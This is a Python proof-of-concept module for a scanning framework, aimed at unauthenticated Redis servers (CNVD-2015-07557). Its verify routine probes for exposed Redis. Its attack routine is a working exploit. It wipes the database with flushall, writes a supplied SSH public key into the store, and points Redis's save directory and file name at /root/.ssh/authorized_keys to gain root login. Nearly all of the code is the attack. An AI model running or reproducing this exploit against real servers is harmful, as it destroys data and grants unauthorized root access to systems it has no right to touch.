#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import socket
import redis
import sys
from newpoc.api import PocBase, Output
from newpoc.cli import POC_QUEUE


class POC(PocBase):
    cnvd_cve = 'CNVD-2015-07557'  # 漏洞编号
    version = '1'  # 默认为1
    author = 'myxae86'  # PoC 作者名字
    vulDate = '2015-11-17'  # 漏洞公开的时间
    createDate = '2021-08-28'  # 编写 PoC 的日期
    updateDate = '2021-08-29'  # PoC 更新的时间，默认和编写时间一样
    references = []  # 漏洞地址来源
    name = 'Redis未授权访问漏洞'  # PoC 名称
    appPowerLink = 'https://redis.io/'  # 漏洞厂商主页地址
    appName = 'Redis'  # 漏洞应用名称
    appVersion = '4.x/5.0.5'  # 漏洞影响版本
    vulType = 'Unauthorized Access'  # 漏洞类型
    desc = '''
        Redis默认情况下会绑定在0.0.0.0:6379，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。
        攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys文件中，进而可以直接登录目标服务器。
        *1
        $4
        info
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = ['redis']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = "pocs/Redis/redisdone.py"

    output = Output()

    def _verify(self, ip):
        result = POC.parse_output()

        ip = ip['url']
        result_url = ip
        ip, port = ip.split(':')
        payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        try:
            s.connect((ip, int(port)))
            s.sendall(payload.encode())
            recvdata = s.recv(1024).decode()
            if 'redis_version' in recvdata:
                self.output.success('{} is vulnerable '.format(ip))
                result['target-url'] = result_url
                POC_QUEUE.put(result)
            else:
                self.output.fail('{} is not vulnerable '.format(ip))
        except Exception as err:
            self.output.fail('{0} is fail {1}'.format(ip, err))

    def _attack(self, payload):
        try:
            result = POC.parse_output()

            sshkey = payload['payload']
            ip, port = payload['url'].split(':')
            # self.output.error(sshkey)
            r = redis.StrictRedis(host=ip, port=port, db=0, socket_timeout=5)
            r.flushall()
            r.set('crackit', sshkey)
            r.config_set('dir', '/root/.ssh/')
            r.config_set('dbfilename', 'authorized_keys')
            r.save()

            result['payload'] = "SSHkeygen successful"
            POC_QUEUE.put(result)
            self.output.success('[+] Write SSHkeygen successful')
        except:
            self.output.error('[-] Write SSHkeygen Failed')
            pass

    def _shell(self):
        pass

    @staticmethod
    def parse_output():
        result = {
            "target-url": '',
            "poc-name": POC.name,
            "poc-id": POC.cnvd_cve,
            "component": POC.vulType,
            "version": POC.appVersion,
            "status": 'ok',
            "payload": ''
        }
        return result


if __name__ == "__main__":
    c = POC()
    print(c.parse_detail())
